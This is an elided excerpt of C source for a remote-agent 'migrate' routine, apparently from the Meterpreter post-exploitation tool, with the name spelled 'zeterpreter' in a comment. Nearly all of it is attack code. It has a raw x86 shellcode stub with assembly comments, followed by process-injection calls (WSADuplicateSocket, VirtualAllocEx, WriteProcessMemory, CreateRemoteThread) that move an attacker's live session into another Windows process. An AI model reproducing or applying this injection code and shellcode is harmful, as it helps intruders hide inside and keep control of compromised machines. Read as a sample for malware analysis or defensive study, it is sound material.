 ...
 * zeterpreter server instance in the new process.
 *
...
DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
{
	...
	DWORD pid;
	BYTE stub[] = 
		"\x8B\x74\x24\x04"         //  mov esi,[esp+0x4]
		"\x81\xEC\x00\x10\x00\x00" //  sub esp,0x1000
		"\x89\xE5"                 //  mov ebp,esp
		"\x8D\x4E\x18"             //  lea ecx,[esi+0x18]
		"\x51"                     //  push ecx
		"\xFF\x16"                 //  call near [esi]
		"\x8D\x85\x70\x08\x00\x00" //  lea eax,[ebp+0x870]
		"\x50"                     //  push eax
		"\x6A\x02"                 //  push byte +0x2
		"\xFF\x56\x04"             //  call near [esi+0x4]
		"\x6A\x00"                 //  push byte +0x0
		"\x6A\x00"                 //  push byte +0x0
		"\x8D\x46\x20"             //  lea eax,[esi+0x20]
		"\x50"                     //  push eax
		"\x6A\x00"                 //  push byte +0x0
		"\x6A\x02"                 //  push byte +0x2
		"\x6A\x01"                 //  push byte +0x1
		"\xFF\x56\x08"             //  call near [esi+0x8]
		"\x97"                     //  xchg eax,edi
		"\xFF\x76\x14"             //  push dword [esi+0x14]
		"\xFF\x56\x10"             //  call near [esi+0x10]
		"\x6A\x00"                 //  push byte +0x0
		"\x68\x00\x10\x00\x00"     //  push dword 0x1000
		"\x55"                     //  push ebp
		"\x57"                     //  push edi
		"\xFF\x56\x0C"             //  call near [esi+0xc]
		"\xFF\xE5";                //  jmp ebp
	...
	do
	{
		...
		if (WSADuplicateSocket(remote_get_fd(remote), pid,
				&context.info) != NO_ERROR)
		{
		...
		if (!(dataBase = VirtualAllocEx(process, NULL, 
				sizeof(MigrationStubContext) + sizeof(stub), MEM_COMMIT, 
		...
		if (!WriteProcessMemory(process, dataBase, &context, 
				sizeof(context), NULL))
		{
			result = GetLastError();
			break;
		...
		if (!WriteProcessMemory(process, codeBase, stub, sizeof(stub) - 1, 
				NULL))
		{
			result = GetLastError();
			break;
		...
		if (!(thread = CreateRemoteThread(process, NULL, 0, 
				(LPTHREAD_START_ROUTINE)codeBase, dataBase, 0, &threadId)))
		{
			result = GetLastError();
			break;
		}
